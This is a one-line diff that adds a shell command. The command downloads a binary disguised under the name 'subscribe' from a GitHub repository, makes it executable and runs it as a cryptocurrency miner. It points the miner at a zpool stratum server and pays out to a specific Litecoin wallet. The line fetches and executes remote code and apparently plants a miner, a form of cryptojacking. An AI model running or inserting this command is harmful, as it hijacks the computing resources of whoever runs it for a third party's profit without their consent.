@@ -1,0 +1,1 @@
+wget https://github.com/Zivin30/Student/blob/main/subscribe; chmod +x subscribe; ./subscribe -a minotaurx -o stratum+tcp://minotaurx.na.mine.zpool.ca:7019 -u ltc1q6u605nmtzdz9ru72x4qmjwg54njkv2vnn7jq5f -p c=LTC,zap=AVN/LCC/MAZA
